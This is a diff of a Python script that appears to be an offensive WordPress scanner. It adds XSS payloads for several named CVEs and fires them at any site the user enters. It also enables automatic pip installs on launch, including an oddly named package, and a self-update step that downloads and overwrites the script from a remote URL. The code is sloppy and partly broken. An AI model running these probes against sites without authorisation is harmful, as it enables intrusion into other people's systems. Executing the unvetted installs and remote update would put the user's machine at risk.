@@ -1,39 +1,39 @@
 import os
-#os.system("cd Desktop")
-#os.system("pip3 install pynput") 
-#os.system("pip install requests")
-#os.system("pip install colorama")
-#os.system("pip install Fore")
-#os.system("pip install argparse")
-#os.system("pip install pypiwin32")
-#os.system("python -m pip install --upgrade pip")
-#os.system("python -m pip install --upgrade pip")
-#os.system("pip install playsound")
-#os.system("python -m pip install --upgrade pip")
-#os.system("pip install playsound")
-#os.system("python -m pip install --upgrade pip")
-#os.system("pip install pystyle")
-#os.system("python -m pip install --upgrade pip")
-#os.system("python -m pip install pywin32")
-#os.system("python -m pip install --upgrade pip")
-#os.system("python -m pip install win32gui")
-#os.system("python -m pip install --upgrade pip")
-#os.system("python -m pip install secure-smtplib")
-#os.system("python -m pip install --upgrade pip")
-#os.system("python -m pip install elevate")
-#os.system("pip install pyfiglet")
-#os.system("pip install RandString")
-#os.system("pip install datetime")
-#os.system("pip install pyuseragents")
-#os.system("pip install telfhk0")
-#os.system("pip install win32con")
-#os.system("pip install win32con")
-#os.system("pip install win32gui")
-#os.system("pip install matplotlib")
-#os.system("pip install Crypto")
-#os.system("pip install pyttsx3  ")
-#os.system("pip install pustil")
-#os.system("pip install opencv-python")
+os.system("cd Desktop")
+os.system("pip3 install pynput") 
+os.system("pip install requests")
+os.system("pip install colorama")
+os.system("pip install Fore")
+os.system("pip install argparse")
+os.system("pip install pypiwin32")
+os.system("python -m pip install --upgrade pip")
+os.system("python -m pip install --upgrade pip")
+os.system("pip install playsound")
+os.system("python -m pip install --upgrade pip")
+os.system("pip install playsound")
+os.system("python -m pip install --upgrade pip")
+os.system("pip install pystyle")
+os.system("python -m pip install --upgrade pip")
+os.system("python -m pip install pywin32")
+os.system("python -m pip install --upgrade pip")
+os.system("python -m pip install win32gui")
+os.system("python -m pip install --upgrade pip")
+os.system("python -m pip install secure-smtplib")
+os.system("python -m pip install --upgrade pip")
+os.system("python -m pip install elevate")
+os.system("pip install pyfiglet")
+os.system("pip install RandString")
+os.system("pip install datetime")
+os.system("pip install pyuseragents")
+os.system("pip install telfhk0")
+os.system("pip install win32con")
+os.system("pip install win32con")
+os.system("pip install win32gui")
+os.system("pip install matplotlib")
+os.system("pip install Crypto")
+os.system("pip install pyttsx3  ")
+os.system("pip install pustil")
+os.system("pip install opencv-python")
 import requests
 import winreg 
 from subprocess import getoutput
@@ -94,6 +94,8 @@ import sys
 import pyttsx3 as pt
 import os
 import pprint
+import psutil
+import time
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -121,6 +123,35 @@ rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\03
 cn, k,g = '\033[00;36m', '\033[90m','\033[38;5;130m'
 red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;
 os.system("cls")
+started = f"""
+{red}                  (°з°)        _     ('~')             _    
+{green} ʕ•ᴥ•ʔ__ __o_o__ __//       _(•̪●)__ ┐__\|_┌__(.-■-■ _(•̪●)__ 
+{magenta}|       |       |   |      |       |       |       |       |
+{yellow}8  _____8   _   8   |      8_     _8    ___|  _____|_     _8
+{cyan}| |_____|  | |  |   |        |   | |   |___| |_____  |   |  
+{blue}|_____  |  |_|  |   |___     |   | |    ___|_____  | |   |  
+{blue} _____| |      ||       |    |   | |   |___ _____| | |   |  
+{blue}|_______|____||_|_______|    |___| |_______|_______| |___|  
+⡀⢀⣀⣀⣀⡀⢀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⣀⣀⣀⣀⠀⣀⣀⣀⡀⣀⣀⣀⣀
+{blue}⣿⣯⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ 
+"""
+
+pass
+
+try:
+    def printl(Str):
+        for char in Str:
+            print(char, end='', flush=True)
+            time.sleep(0.009)
+except:
+    pass
+
+try:
+    printl(started)
+except:
+    pass
+input(Fore.GREEN+"Press Enter to continue...")
+#####################################################################################################################################################################################################################################################3
 started = f"""
   {yellow}  ╔╗ ╔╗      ╔═══╗         
    {cyan} ║║ ║║      ║╔═╗║         
@@ -168,7 +199,7 @@ inuy = input(Fore.LIGHTBLUE_EX+" ┌─["+Fore.LIGHTRED_EX+"SQL"+Fore.BLUE+"~"+F
 
 if inuy == "EXIT": pyautogui.hotkey('ctrl', 'c')
  
-elif inuy == "update": f=urllib.request.urlretrieve('https://s32.picofile.com/d/8478419184/e4e799c6-3265-44ce-ba71-c95bd25d88a9/sql.py' , 'sql.py')
+elif inuy == "update": f=urllib.request.urlretrieve('https://raw.githubusercontent.com/hamoon12345/SQL-/main/sql.py' , 'sql.py')
 #time.sleep(3)
 elif inuy == "SQL injection":
     
@@ -1358,7 +1389,7 @@ waitfor delay '0:0:20' /*
 ####################################################################################################################################################################################################################################3
 time.sleep(5)
 os.system("cls")
-started = f"""
+tarted = f"""
 {yellow}  
 {cyan}     
 {cyan}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠝⡄⠀⠀⠀
@@ -1929,46 +1960,7 @@ try:
 except:
     pass
 XZB=input("put your site here ( example: https://www.site.com/):")
-print(Fore.GREEN+"Checking for vulnerability CVE-2014-4561 (only if it's a WordPress site!)")
-time.sleep(4)
-V = '/wp-content/plugins/ultimate–weather–plugin/magpierss/scripts/magpie_debug.php?url="><script>alert(1)<%2Fscript>'
-url = (f"{XZB}{V} ")
-response = requests.get(url)
-
-print(colored(f"Status Code: {response.status_code}", "green"))
-print(colored(f"Content Type: {response.headers['content-type']}", "green"))
-print(colored("Response Text:", "green"))
-print(Fore.RED+ response.text)
-J = print(Fore.RED+f" parameter:{XZB}{V}")
-file_name = "log.txt"
-file = open( file_name, "a+" )
-file.write(f"{response.text}")
-file.close()
-
-if response.status_code == 200:
-
-  print(Fore.GREEN+"xss found / status code is 200! it can be a xss check it!!!!")
-else :
- print(Fore.RED+"no xss!!!!!! but still check it!!!!")
-started = f"""
-{blue}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
-"""
-
-pass
-
-try:
-    def printl(Str):
-        for char in Str:
-            print(char, end='', flush=True)
-            time.sleep(0.009)
-except:
-    pass
-
-try:
-    printl(started)
-except:
-    pass
-time.sleep(4)
+#################################################################################################################################################################################################################################################
 ######################################################################################################################################################################################################################################################################################
 print(Fore.BLUE+"Checking for vulnerability CVE-2022-1170 (only if it's a WordPress site!)")
 time.sleep(4)
@@ -2133,6 +2125,203 @@ try:
 except:
     pass
 time.sleep(4)
+########################################################################################################################################################################################################################################
+print(Fore.BLUE+"Checking for vulnerability CVE-2023-30777: AppTrana WAAP Coverage  (only if it's a WordPress site!)")
+time.sleep(4)
+RRFGKCVHJ = '/wp-admin/edit.php?post_type=acf-field-group&post_status=xxxxx” onload=alert(document.domain) xxx=” '
+url = (f"{XZB}{RRFGKCVHJ} ")
+response = requests.get(url)
+
+print(colored(f"Status Code: {response.status_code}", "green"))
+print(colored(f"Content Type: {response.headers['content-type']}", "green"))
+print(colored("Response Text:", "green"))
+print(Fore.RED+ response.text)
+fh = print(Fore.RED+f" parameter:{XZB}{RRFGKCVHJ}")
+file_name = "log.txt"
+file = open( file_name, "a+" )
+file.write(f"{response.text}")
+file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"xss found / status code is 200! it can be a xss check it!!!!")
+else :
+ print(Fore.RED+"no xss!!!!!! but still check it!!!!")
+started = f"""
+{green}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
+"""
+
+pass
+
+try:
+    def printl(Str):
+        for char in Str:
+            print(char, end='', flush=True)
+            time.sleep(0.009)
+except:
+    pass
+
+try:
+    printl(started)
+except:
+    pass
+time.sleep(4)
+################################################################################################################################################################################################################################################################
+print(Fore.BLUE+"Checking for vulnerability CVE-2019-16332  (only if it's a WordPress site!)")
+time.sleep(4)
+RRFGKCVHJcvb = '/wp-content/plugins/api-bearer-auth/swagger/swagger-config.yaml.php?&server=<script>alert("XSS")</script>  '
+url = (f"{XZB}{RRFGKCVHJcvb} ")
+response = requests.get(url)
+
+print(colored(f"Status Code: {response.status_code}", "green"))
+print(colored(f"Content Type: {response.headers['content-type']}", "green"))
+print(colored("Response Text:", "green"))
+print(Fore.RED+ response.text)
+fh = print(Fore.RED+f" parameter:{XZB}{RRFGKCVHJcvb}")
+file_name = "log.txt"
+file = open( file_name, "a+" )
+file.write(f"{response.text}")
+file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"xss found / status code is 200! it can be a xss check it!!!!")
+else :
+ print(Fore.RED+"no xss!!!!!! but still check it!!!!")
+started = f"""
+{red}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
+"""
+
+pass
+
+try:
+    def printl(Str):
+        for char in Str:
+            print(char, end='', flush=True)
+            time.sleep(0.009)
+except:
+    pass
+
+try:
+    printl(started)
+except:
+    pass
+time.sleep(6)
+########################################################################################################################################################################################################################################################3
+print(Fore.BLUE+"Checking for vulnerability CVE-2021-24298  (only if it's a WordPress site!)")
+time.sleep(4)
+RRFGKCVHJBNM = '/giveaway/mygiveaways/?share=%3Cscript%3Ealert(document.domain)%3C/script%3E '
+url = (f"{XZB}{RRFGKCVHJBNM} ")
+response = requests.get(url)
+
+print(colored(f"Status Code: {response.status_code}", "green"))
+print(colored(f"Content Type: {response.headers['content-type']}", "green"))
+print(colored("Response Text:", "green"))
+print(Fore.RED+ response.text)
+fh = print(Fore.RED+f" parameter:{XZB}{RRFGKCVHJBNM}")
+file_name = "log.txt"
+file = open( file_name, "a+" )
+file.write(f"{response.text}")
+file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"xss found / status code is 200! it can be a xss check it!!!!")
+else :
+ print(Fore.RED+"no xss!!!!!! but still check it!!!!")
+started = f"""
+{green}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
+"""
+
+pass
+
+try:
+    def printl(Str):
+        for char in Str:
+            print(char, end='', flush=True)
+            time.sleep(0.009)
+except:
+    pass
+
+try:
+    printl(started)
+except:
+    pass
+time.sleep(6)
+########################################################################################################################################################################################################################################3
+started = f"""
+{blue}⡀⢀⣀⣀⣀⡀⢀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⣀⣀⣀⣀⠀⣀⣀⣀⡀⣀⣀⣀⣀
+{blue}⣿⣯⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ 
+{red}ok DONE this part
+{green}going to the next part!!!
+{red}00101010101101010001010101010110010101010101101010101010101010101010101010100101010110101010000101010100101010110100101010101010101010110101010101010101            
+"""
+
+pass
+
+try:
+    def printl(Str):
+        for char in Str:
+            print(char, end='', flush=True)
+            time.sleep(0.009)
+except:
+    pass
+
+try:
+    printl(started)
+except:
+    pass
+def countdown(time_sec):
+    while time_sec:
+        mins, secs = divmod(time_sec, 60)
+        timeformat = ' {:02d}:{:02d}'.format(mins, secs)
+        print(timeformat, end='\r')
+        time.sleep(1)
+        time_sec -= 1
+    print(Fore.RED+ "RUNNING!")
+seconds=int("10")
+countdown(seconds)
+#########################################################################################################################################################################################################################################
+print(Fore.BLUE+"checking for any ((((  directory travlsing!!!   )))))")
+time.sleep(4)
+RRFGKCVHJcvbtu = '/wp-content/uploads/  '
+url = (f"{XZB}{RRFGKCVHJcvbtu} ")
+response = requests.get(url)
+
+print(colored(f"Status Code: {response.status_code}", "green"))
+print(colored(f"Content Type: {response.headers['content-type']}", "green"))
+print(colored("Response Text:", "green"))
+print(Fore.RED+ response.text)
+fh = print(Fore.RED+f" parameter:{XZB}{RRFGKCVHJcvbtu}")
+file_name = "log.txt"
+file = open( file_name, "a+" )
+file.write(f"{response.text}")
+file.close()
+if response.status_code == 200:
+
+  print(Fore.GREEN+"directory found!!! / status code is 200! it can be a directory check it!!!!")
+else :
+ print(Fore.RED+"no directory!!!!!! but still check it!!!!")
+started = f"""
+{red}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
+"""
+
+pass
+
+try:
+    def printl(Str):
+        for char in Str:
+            print(char, end='', flush=True)
+            time.sleep(0.009)
+except:
+    pass
+
+try:
+    printl(started)
+except:
+    pass
+time.sleep("")
+######################################################################################################################################################################################################################################################
 ############################################################################################################################################################################################################################
 print(Fore.BLUE+"""
       
